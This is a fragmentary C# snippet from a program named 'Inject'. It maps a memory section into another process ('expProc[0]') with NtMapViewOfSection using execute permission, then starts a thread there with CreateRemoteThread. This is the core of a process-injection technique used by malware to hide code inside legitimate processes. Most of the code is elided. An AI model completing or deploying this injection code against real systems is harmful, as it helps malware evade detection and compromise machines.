...
namespace Inject
{
    class Program
    {
        ...
        static void Main(string[] args)
        {
            ...
            result = NtMapViewOfSection(sectionhandle, expProc[0].Handle, ref sectionBaseAddress2, v, v, out ox, out viewSize, 0x2, 0, 0x20);
            if (result == 0)
            {
            ...
            IntPtr modulePath = CreateRemoteThread(expProc[0].Handle, IntPtr.Zero, 0, sectionBaseAddress2, IntPtr.Zero, 0, IntPtr.Zero);
